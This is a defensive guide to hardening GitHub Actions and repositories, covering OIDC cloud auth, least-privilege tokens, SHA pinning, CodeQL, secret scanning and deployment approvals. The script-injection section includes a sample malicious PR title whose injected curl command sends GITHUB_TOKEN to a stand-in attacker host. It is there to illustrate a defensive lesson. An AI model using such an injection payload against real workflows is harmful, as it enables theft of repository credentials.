# GitHub Security Hardening

**Sources:** GitHub official documentation — "Security hardening for GitHub Actions"
(docs.github.com, 2025); GitHub Advanced Security (GHAS) official documentation — Secret
Protection and Code Security product pages (as split September 2025); OIDC documentation
— "About security hardening with OpenID Connect" (docs.github.com); StepSecurity, "7 GitHub
Actions Security Best Practices" (stepsecurity.io, 2025); Palo Alto Unit 42 / StepSecurity
— GhostAction campaign analysis (September 2025, 327 accounts hijacked, 3,325 secrets
stolen); Megalodon campaign analysis (May 2026, 5,718 malicious commits); tj-actions/
changed-files supply chain incident postmortem; Orca Security — TanStack incident report
(May 2026).

---

## 1. OIDC — Eliminate Long-Lived Cloud Credentials

The most impactful single security improvement for GitHub Actions: replacing static cloud
credentials stored as GitHub Secrets with short-lived tokens issued at job runtime via
OpenID Connect (OIDC). This is the GitHub-recommended approach for all AWS, GCP, and Azure
deployments as of 2024.

**Why static credentials are dangerous:**
- Stored in GitHub Secrets indefinitely — a repository compromise exposes permanent access
- GhostAction (Sep 2025): 327 accounts hijacked, 3,325 secrets stolen — static credentials
  were exfiltrated and remained valid long after the breach was contained
- Rotation is manual and often neglected

**OIDC: how it works:**
GitHub acts as an OIDC identity provider. Each workflow run receives a short-lived JWT
(expires with the run) that cloud providers can verify directly. No static credential
stored anywhere.

```
GitHub Runner ──▶ GitHub OIDC endpoint → issues JWT for this workflow run
      │
      ├──▶ Presents JWT to AWS STS → receives temporary credentials (15min TTL)
      ├──▶ Presents JWT to GCP Workload Identity → receives access token
      └──▶ Presents JWT to Azure → receives access token
```

### AWS OIDC Configuration

```yaml
# .github/workflows/deploy.yml
jobs:
  deploy:
    runs-on: ubuntu-latest
    permissions:
      id-token: write   # required to request the OIDC JWT
      contents: read

    steps:
      - uses: actions/checkout@v4

      - name: Configure AWS credentials via OIDC (no static secrets)
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::123456789:role/github-actions-deploy
          aws-region: us-east-1
          # No AWS_ACCESS_KEY_ID or AWS_SECRET_ACCESS_KEY — credentials issued per run
```

**AWS IAM trust policy (restrict which repos/branches can assume this role):**
```json
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": { "Federated": "arn:aws:iam::123456789:oidc-provider/token.actions.githubusercontent.com" },
    "Action": "sts:AssumeRoleWithWebIdentity",
    "Condition": {
      "StringEquals": {
        "token.actions.githubusercontent.com:aud": "sts.amazonaws.com",
        "token.actions.githubusercontent.com:sub": "repo:my-org/my-repo:ref:refs/heads/main"
      }
    }
  }]
}
```

`sub` supports fine-grained restrictions: by repo, branch, environment, or PR:
```
repo:org/repo:ref:refs/heads/main          → only main branch
repo:org/repo:environment:production        → only production environment deployments
repo:org/repo:pull_request                 → only PR workflows (read-only scenarios)
```

### GCP OIDC

```yaml
      - name: Authenticate to GCP via OIDC
        uses: google-github-actions/auth@v2
        with:
          workload_identity_provider: projects/123/locations/global/workloadIdentityPools/github/providers/github
          service_account: deploy@my-project.iam.gserviceaccount.com
```

### Azure OIDC

```yaml
      - name: Authenticate to Azure via OIDC
        uses: azure/login@v2
        with:
          client-id: ${{ vars.AZURE_CLIENT_ID }}
          tenant-id: ${{ vars.AZURE_TENANT_ID }}
          subscription-id: ${{ vars.AZURE_SUBSCRIPTION_ID }}
          # No AZURE_CLIENT_SECRET — federated credentials only
```

---

## 2. GITHUB_TOKEN — Minimal Permissions

The `GITHUB_TOKEN` is automatically issued to every workflow run. Its default permissions
vary by organization settings but are often broader than needed. Applying least privilege
at the workflow and job level is the correct discipline.

```yaml
# Apply minimal permissions at the workflow level (affects all jobs)
permissions:
  contents: read       # read repo content
  # everything else: none (not listed = denied)

jobs:
  test:
    # Override at job level if a specific job needs more
    permissions:
      contents: read
      checks: write      # only this job creates check runs
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm test

  release:
    permissions:
      contents: write    # only this job needs to push tags/releases
      packages: write    # only this job needs to push to GHCR
```

**Common permission scopes:**

| Permission | Write needed for |
|---|---|
| `contents` | Push code, create tags, release assets |
| `packages` | Publish Docker images to GHCR |
| `pull-requests` | Create or update PRs |
| `issues` | Create, comment on, or close issues |
| `checks` | Create check runs (test results) |
| `id-token` | Request OIDC JWT for cloud auth |
| `deployments` | Create deployment records |

**Never use `permissions: write-all`** in production workflows — this grants full access
to all repository resources. Any action in the workflow can then write to any resource.

---

## 3. Pin Actions to SHA Hashes

Third-party actions (and even GitHub's own actions) are mutable when referenced by tag.
`actions/checkout@v4` can change if the maintainer force-pushes the `v4` tag —
or if a supply chain attack compromises the action's repository.

```yaml
# ❌ Mutable tag — vulnerable to supply chain attack
- uses: actions/checkout@v4
- uses: some-org/some-action@v2.1.0

# ✅ Immutable SHA pin — the action's code is frozen to this exact commit
- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
- uses: some-org/some-action@a1b2c3d4e5f6...                       # vX.Y.Z
```

**Tools to automate SHA pinning:**

```bash
# Renovate — auto-creates PRs to update pinned SHAs when new releases are available
# Add to renovate.json:
{
  "github-actions": { "pinDigests": true }
}

# StepSecurity's Harden-Runner — analyzes existing workflows and suggests SHA pins
npx @step-security/harden-runner
```

**Automate pin updates so you don't fall behind on security patches:**
Pinning without automated updates trades supply chain risk for stale dependency risk.
Configure Renovate or Dependabot to keep pins current.

```yaml
# .github/dependabot.yml — keep GitHub Actions SHA pins up to date
version: 2
updates:
  - package-ecosystem: "github-actions"
    directory: "/"
    schedule:
      interval: "weekly"
```

---

## 4. Script Injection Prevention

When workflow steps interpolate GitHub context values (`${{ github.event.* }}`) directly
into `run` commands, an attacker can inject shell commands via PR titles, issue bodies,
branch names, or commit messages.

```yaml
# ❌ VULNERABLE — direct interpolation evaluates shell metacharacters
- name: Process issue
  run: |
    echo "Processing: ${{ github.event.issue.title }}"
    # Malicious PR title: `"; curl https://attacker.com/steal?token=$GITHUB_TOKEN; echo "`
    # → shell executes the injected curl command with full token access

# ✅ SECURE — pass context values through environment variables
- name: Process issue
  env:
    ISSUE_TITLE: ${{ github.event.issue.title }}  # sanitized as a string
  run: |
    echo "Processing: $ISSUE_TITLE"
    # Shell does not evaluate $ISSUE_TITLE as a command — it's a literal string value
```

**Context values that come from untrusted user input (always sanitize):**
```
github.event.issue.title           → issue title (public input)
github.event.pull_request.title    → PR title (public input)
github.event.pull_request.body     → PR description (public input)
github.event.comment.body          → issue/PR comment (public input)
github.head_ref                    → branch name from fork (public input)
github.event.commits[*].message    → commit messages (public input)
```

**Validate inputs if you must process them:**
```yaml
- name: Validate branch name
  env:
    BRANCH_NAME: ${{ github.head_ref }}
  run: |
    # Reject branch names with suspicious characters
    if [[ ! "$BRANCH_NAME" =~ ^[a-zA-Z0-9/_.-]+$ ]]; then
      echo "Invalid branch name: $BRANCH_NAME" && exit 1
    fi
```

---

## 5. GitHub Advanced Security (GHAS)

As of September 2025, GHAS is split into two separately-purchasable products (both free
for public repositories; licensed per-committer for private/internal repositories):

### Secret Protection (formerly Secret Scanning)

Detects secrets — API keys, tokens, credentials — in repository content.

**Push protection (most valuable feature):** blocks commits containing detected secrets
before they reach the remote, rather than alerting after the fact.

```bash
# Configure push protection for a repository via CLI
gh api repos/{owner}/{repo}/code-security/configs \
  --method POST \
  --field secret_scanning=enabled \
  --field secret_scanning_push_protection=enabled
```

**Custom patterns** — add regex patterns for your organization-specific secrets:
```yaml
# .github/secret_scanning.yml — define custom patterns
patterns:
  - name: Internal API Key
    pattern: "MY_COMPANY_KEY_[A-Z0-9]{32}"
    description: Internal service API key pattern
```

**If a secret is exposed:**
1. Immediately rotate the credential (the secret is compromised the moment it touches git history)
2. Run `git filter-repo` or BFG Repo Cleaner to purge from history (pushed history is still retrievable by anyone who cloned before the purge)
3. Enable push protection to prevent recurrence

### Code Security (formerly Code Scanning / CodeQL)

**CodeQL** is GitHub's semantic code analysis engine. It treats code as data and queries it
for vulnerability patterns. Used internally at GitHub, Microsoft, Google.

```yaml
# .github/workflows/codeql.yml — add to any repository
name: CodeQL

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]
  schedule:
    - cron: "0 2 * * 1"  # weekly Monday 2AM — catch new vulnerability patterns

jobs:
  analyze:
    runs-on: ubuntu-latest
    permissions:
      security-events: write
      contents: read

    strategy:
      matrix:
        language: [javascript-typescript, python]  # add languages your repo uses

    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2

      - name: Initialize CodeQL
        uses: github/codeql-action/init@v3
        with:
          languages: ${{ matrix.language }}
          # Custom queries — target specific vulnerability classes:
          # queries: security-extended  # broader than default; more findings
          # queries: security-and-quality  # broadest

      - name: Autobuild
        uses: github/codeql-action/autobuild@v3

      - name: Perform CodeQL Analysis
        uses: github/codeql-action/analyze@v3
```

**Copilot Autofix** (Code Security feature): when CodeQL detects a vulnerability, GitHub
Copilot generates a suggested fix as a PR — automated remediation that a developer reviews.

**Dependency review** — blocks PRs that introduce vulnerable dependencies:
```yaml
# .github/workflows/dependency-review.yml
name: Dependency Review
on: [pull_request]

jobs:
  dependency-review:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683
      - uses: actions/dependency-review-action@v4
        with:
          fail-on-severity: high        # block PRs with high/critical vulnerabilities
          deny-licenses: GPL-2.0, AGPL-3.0  # block copyleft licenses if applicable
```

---

## 6. Environment Protection Rules

Environments (staging, production) can require mandatory human approval before a
deployment workflow proceeds — preventing accidental or malicious deployments.

```yaml
# .github/workflows/deploy.yml
jobs:
  deploy-production:
    environment: production    # references the "production" environment in Settings
    # → GitHub pauses here and requires designated reviewers to approve before proceeding
    # → Secrets scoped to this environment are only revealed after approval
    runs-on: ubuntu-latest
    steps:
      - name: Deploy
        run: ./scripts/deploy.sh
        env:
          DEPLOY_TOKEN: ${{ secrets.PRODUCTION_DEPLOY_TOKEN }}  # env-scoped secret
```

**Environment settings to configure in GitHub → Settings → Environments:**
- Required reviewers (up to 6 people or teams)
- Deployment branches (e.g., only `main` can deploy to production)
- Wait timer (add a delay after approval before deployment proceeds)
- Environment secrets (scoped — only visible during deployment, after approval)

---

## 7. Organization-Level Security Policy

For organizations managing multiple repositories, enforce security baselines via:

**Repository rulesets (GitHub → Settings → Rulesets):**
```
Enforce:
  ✅ Require pull request reviews (1+ approvals) before merging to main
  ✅ Require status checks (CI) to pass before merging
  ✅ Require conversation resolution before merging
  ✅ Block force pushes to protected branches
  ✅ Restrict deletion of protected branches
  ✅ Require signed commits (GPG/SSH signing)
```

**Code security configurations (apply across all repos in org):**
```yaml
# Configure via GitHub API or via Organizations → Code security → Configurations
# Apply as baseline to all repositories:
secret_scanning: enabled
secret_scanning_push_protection: enabled
dependabot_alerts: enabled
dependabot_security_updates: enabled
code_scanning_default_setup: enabled  # enables CodeQL with default queries
```

---

## 8. Security Hardening Checklist (GitHub)

```
CI/CD Pipeline
- [ ] OIDC configured for all cloud deployments — no static cloud credentials in Secrets
- [ ] GITHUB_TOKEN has minimal permissions declared at workflow and job level
- [ ] All third-party actions pinned to full commit SHA hashes (not mutable tags)
- [ ] SHA pins kept up to date via Renovate or Dependabot github-actions updates
- [ ] No pull_request_target + checkout of fork code combination (see web-devops/security.md)
- [ ] All untrusted context values passed via env vars, not direct interpolation in run steps
- [ ] Environment protection rules with required approvers for staging/production

Repository & Organization
- [ ] GHAS Secret Protection enabled with push protection
- [ ] GHAS Code Security (CodeQL) running on push and PR
- [ ] Dependency review blocking high/critical CVEs on PRs
- [ ] Dependabot security updates enabled
- [ ] Branch protection rules: require PR review, status checks, no force push
- [ ] Require signed commits for protected branches
- [ ] Repository access principle of least privilege (collaborator roles, not admin for all)
- [ ] Security advisories configured (repo → Security → Advisories) for responsible disclosure

Incident Response
- [ ] Secret exposed? → Rotate immediately → purge from git history → enable push protection
- [ ] Supply chain attack suspected? → check workflow files for unauthorized changes
- [ ] Review GitHub audit log (Organization → Settings → Audit log) for unexpected events
- [ ] Subscribe to GitHub Security Advisories for actions you depend on
```
